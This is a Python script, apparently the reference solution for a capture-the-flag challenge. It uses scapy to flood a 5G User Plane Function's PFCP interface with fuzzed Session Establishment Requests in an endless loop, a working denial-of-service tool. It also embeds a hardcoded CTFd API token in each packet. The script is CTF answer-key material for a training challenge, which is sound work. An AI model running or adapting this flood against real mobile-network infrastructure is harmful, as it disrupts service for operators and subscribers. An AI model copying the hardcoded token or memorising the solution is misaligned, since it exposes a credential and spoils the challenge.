"""
Sample attack for the PFCP Session Creation Resource Exhaustion challenge.

Floods the UPF's N4 interface with fuzzed PFCP Session Establishment
Requests, simulating a volumetric Denial of Service attack. Each packet
embeds the attacker's CTFd API token so the judge can attribute a
successful solve to the correct participant.

Provided for verification purposes; participants are expected to build
their own solution based on the challenge description.
"""

from scapy.all import *
from scapy.contrib.pfcp import (
    PFCP,
    PFCPSessionEstablishmentRequest,
    IE_FSEID,
    IE_CreateFAR,
    IE_FAR_Id,
    IE_ApplyAction,
    IE_CreatePDR,
    IE_PDI,
    IE_NetworkInstance,
    IE_SourceInterface,
)
import random


def pfcp_flood(target_ip, target_port=8805):
    token = "ctfd_a3fc707a7c1237ec3fab7c7e27e4638c3b6d209fdca31cba9e1ddf6672125008"

    while True:
        # PFCP Session Establishment Request with randomized fields
        pfcp_request = fuzz(PFCP(
            version=1,
            S=1,
            message_type=57,
            length=None,
            seq=random.randint(1, 255),
            spare_oct=0
        ) / PFCPSessionEstablishmentRequest(IE_list=[]))

        # Append the token as a Raw load so the judge can extract it
        packet = IP(dst=target_ip) / UDP(dport=target_port) / pfcp_request / Raw(load=token)

        send(packet, verbose=0)


if __name__ == "__main__":
    pfcp_flood("127.0.0.8")
